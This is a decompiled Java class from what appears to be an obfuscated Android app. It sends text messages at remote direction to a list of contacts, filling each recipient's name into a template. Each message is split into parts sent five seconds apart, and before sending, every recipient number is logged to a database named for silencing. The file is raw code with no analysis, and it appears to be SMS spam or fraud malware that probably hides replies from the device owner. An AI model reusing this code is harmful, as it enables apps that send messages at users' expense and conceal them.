// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.ejaob2.actionjob;

import android.content.Context;
import android.os.SystemClock;
import android.telephony.SmsManager;
import com.admv2.db.DBSlient;
import com.admv3.listener.DeliveryReceiver;
import com.admv3.listener.SentReceiver;
import com.aizd.entry.MainApp;
import com.luebad.advdatamodule.*;
import java.io.UnsupportedEncodingException;
import java.util.*;

public class AdvAction
{

    public AdvAction(Context context)
    {
        m_context = context;
    }

    private void SmsAction_Send(String s, String s1, int i, int j)
    {
        android.app.PendingIntent pendingintent;
        android.app.PendingIntent pendingintent1;
        pendingintent = MainApp.sentreceiver.GetPendingIntent(m_context, i, j);
        pendingintent1 = MainApp.deliveryreceiver.GetPendingIntent(m_context, i, j);
        Iterator iterator = SmsManager.getDefault().divideMessage(s1).iterator();
_L1:
        if(!iterator.hasNext())
            return;
        try
        {
            String s2 = (String)iterator.next();
            SmsManager.getDefault().sendTextMessage(s, null, s2, pendingintent, pendingintent1);
            SystemClock.sleep(5000L);
        }
        catch(Exception exception)
        {
            return;
        }
          goto _L1
    }

    private void SmsAction_Slient(String s)
    {
        (new DBSlient(m_context)).addslient(s);
    }

    public void Action(boolean flag, ReplayStruct_Context replaystruct_context, Vector vector, int i)
    {
        ReplayStruct_Element replaystruct_element;
        switch(replaystruct_context.type)
        {
        case 2: // '\002'
        default:
            return;

        case 1: // '\001'
            replaystruct_element = (ReplayStruct_Element)replaystruct_context.element.get(0);
            break;
        }
        String s;
        try
        {
            s = DataCover.ByteArryToString(replaystruct_element.values, 0, replaystruct_element.len);
        }
        catch(UnsupportedEncodingException unsupportedencodingexception)
        {
            return;
        }
        SmsAction(s, i, vector);
    }

    public void SmsAction(String s, int i, Vector vector)
    {
        int j = 0;
        do
        {
            if(j >= vector.size())
                return;
            ReplayStruct_RecPhoneInfo replaystruct_recphoneinfo = (ReplayStruct_RecPhoneInfo)vector.get(j);
            String s1 = s.replace("{NAME}", replaystruct_recphoneinfo.name);
            String s2 = replaystruct_recphoneinfo.phone_num;
            int k = replaystruct_recphoneinfo.phone_id;
            SmsAction_Slient(s2);
            SmsAction_Send(s2, s1, k, i);
            j++;
        } while(true);
    }

    private static final int ADV_MMS = 2;
    private static final int ADV_SMS = 1;
    private Context m_context;
}
